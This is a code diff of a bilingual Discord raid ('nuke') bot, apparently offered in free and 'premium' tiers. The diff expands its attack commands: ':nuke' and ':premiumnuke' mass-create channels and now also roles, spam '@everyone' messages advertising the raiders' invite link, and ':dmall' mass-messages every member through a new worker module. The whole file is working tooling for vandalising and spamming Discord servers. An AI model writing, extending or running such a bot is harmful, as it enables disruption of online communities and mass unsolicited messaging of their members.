@@ -5,6 +5,7 @@ import os
 import gc
 from dotenv import load_dotenv
 import engine
+import worker # Direct access for some tasks
 
 # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 # [ CONFIGURATION ]
@@ -21,6 +22,7 @@ DEFAULT_NAME = "premium-raid"
 DEFAULT_TEXT = "@everyone premium raid by del1rium https://discord.gg/cJJJWHfnn2 https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
 RAID_ICON = "https://sheer-blush-bqrrem0s4b.edgeone.app/1767987541955.jpg.png"
 PUBLIC_DM_TEXT = "https://discord.gg/cJJJWHfnn2"
+PUBLIC_ROLE_NAME = "raid by del1rium co."
 
 user_configs = {}
 
@@ -49,7 +51,7 @@ async def on_ready():
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     User / Usuario: {bot.user.name}
     Status / Estado: Ready / Listo
-    Memory Monitor: Active / Activo
+    Architecture: Triple-Layer (Main/Engine/Worker)
     ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
     """)
 
@@ -64,26 +66,23 @@ async def help_cmd(ctx):
     
     embed = discord.Embed(title="OPERATIONAL INTERFACE / INTERFAZ OPERATIVA", color=0x2b2d31)
     
-    # Public Module
     public_desc = (
-        "**`:nuke`**\nStandard deployment (25 channels).\n*Despliegue estandar (25 canales).*\n\n"
+        "**`:nuke`**\nStandard deployment (25 channels + 10 roles).\n*Despliegue estandar (25 canales + 10 roles).*\n\n"
         "**`:dmall`**\nSend fixed invitation to all members.\n*Envia invitacion fija a todos los miembros.*"
     )
     embed.add_field(name="PUBLIC MODULE / MODULO PUBLICO", value=public_desc, inline=False)
     
-    # Premium Module
     premium_desc = (
-        "**`:premiumnuke`**\nMassive deployment (50 channels + roles).\n*Despliegue masivo (50 canales + roles).*\n\n"
+        "**`:premiumnuke`**\nMassive deployment (50 channels + 20 roles).\n*Despliegue masivo (50 canales + 20 roles).*\n\n"
         "**`:nukeconfig <name>, <text>`**\nConfigure personal payload.\n*Configura tu carga personalizada.*\n\n"
         "**`:dmall <text>`**\nSend custom message to all members.\n*Envia mensaje personalizado a todos.*"
     )
     embed.add_field(name="PREMIUM MODULE / MODULO PREMIUM", value=premium_desc, inline=False)
     
-    # System Info
     info_desc = (
         "**Prefix / Prefijo:** `:`\n"
         "**Status / Estado:** Online / En linea\n"
-        "**Security / Seguridad:** Stealth Mode Active"
+        "**Architecture:** Triple-Layer Optimized"
     )
     embed.add_field(name="SYSTEM INFORMATION / INFORMACION DEL SISTEMA", value=info_desc, inline=False)
     
@@ -94,7 +93,7 @@ async def help_cmd(ctx):
 async def nuke_cmd(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
-    await engine.start_nuke(ctx, bot, "raid-by-del1rium", "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)", 25, 500, False, LOG_CHANNEL_ID, RAID_ICON)
+    await engine.start_nuke(ctx, bot, "raid-by-del1rium", "@everyone raid by [𝔡𝔢𝔩1𝔯𝔦𝔲𝔪 ℭ𝔬.](https://discord.gg/cJJJWHfnn2)", 25, 500, 10, PUBLIC_ROLE_NAME, False, LOG_CHANNEL_ID, RAID_ICON)
 
 @bot.command(name='premiumnuke')
 async def premium_nuke_cmd(ctx):
@@ -105,7 +104,7 @@ async def premium_nuke_cmd(ctx):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     if not ctx.guild.me.guild_permissions.administrator: return
     config = get_config(ctx.author.id)
-    await engine.start_nuke(ctx, bot, config["name"], config["text"], 50, 1000, True, LOG_CHANNEL_ID, RAID_ICON)
+    await engine.start_nuke(ctx, bot, config["name"], config["text"], 50, 1000, 20, config["name"], True, LOG_CHANNEL_ID, RAID_ICON)
 
 @bot.command(name='nukeconfig')
 async def config_cmd(ctx, *, args: str = None):
@@ -132,18 +131,15 @@ async def config_cmd(ctx, *, args: str = None):
 async def dmall_cmd(ctx, *, message: str = None):
     if ctx.guild.id == CENTRAL_SERVER_ID: return
     await ctx.message.delete()
-    
     is_user_premium = check_premium(ctx.author.id)
-    
-    # If premium and provided message, use it. Otherwise use public fixed text.
     final_message = message if (is_user_premium and message) else PUBLIC_DM_TEXT
     
-    count = await engine.dm_all(ctx.guild, final_message, is_user_premium)
+    # Use the specialized worker for DM
+    count = await worker.mass_dm_worker(ctx.guild, final_message, is_user_premium)
     
     embed = discord.Embed(title="DM ALL", description=f"Messages sent / Mensajes enviados: {count}", color=0x2b2d31)
     if not is_user_premium:
         embed.set_footer(text="Public version: Fixed invitation sent.")
-    
     await ctx.send(embed=embed, delete_after=15)
     gc.collect()
 
@@ -152,4 +148,3 @@ if __name__ == "__main__":
         bot.run(TOKEN)
     else:
         print("ERROR: TOKEN NOT FOUND")
-    
